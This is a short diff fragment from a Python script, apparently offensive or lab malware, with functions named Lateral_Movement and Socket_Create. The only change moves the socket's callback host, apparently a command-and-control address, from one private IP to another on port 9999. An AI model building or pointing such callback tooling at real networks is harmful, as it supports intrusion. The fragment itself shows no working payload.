@@ -232,7 +232,7 @@ def Lateral_Movement():
 
 # 6. 통신
 def Socket_Create():
-    Host = '192.168.0.133'
+    Host = '192.168.40.129'
     Port = 9999
 
     global Client_Socket
